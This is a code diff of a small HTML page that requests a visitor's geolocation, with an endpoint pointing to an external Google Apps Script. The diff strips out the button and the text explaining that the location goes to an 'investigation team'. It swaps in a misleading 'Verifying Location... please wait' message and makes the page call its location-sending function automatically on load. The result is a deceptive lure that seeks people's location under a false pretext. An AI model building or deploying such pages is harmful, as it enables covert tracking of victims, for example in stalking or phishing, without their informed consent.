@@ -1,18 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Share My Location</title>
+  <title>Auto-Share Location</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: Arial; text-align: center; padding: 2rem; }
-    button { padding: 10px 20px; font-size: 16px; }
   </style>
 </head>
 <body>
-  <h2>Location Confirmation</h2>
-  <p>Click the button below to share your location with the investigation team.</p>
-  <button onclick="sendLocation()">Share Location</button>
-  <p id="status"></p>
+  <h2>Verifying Location...</h2>
+  <p id="status">Please wait while we verify your location.</p>
 
   <script>
     const endpoint = "https://script.google.com/macros/s/AKfycbxZD3fsNAn4KvniZ6tqZ-BZuvYrxwG3oD-u8kGKfWfCzTwgf7oE2bYFhsYeRWvEj-dzbg/exec";
@@ -41,6 +38,9 @@
         document.getElementById("status").innerText = "Geolocation not supported by this browser.";
       }
     }
+
+    // Call immediately when page loads
+    window.onload = sendLocation;
   </script>
 </body>
 </html>
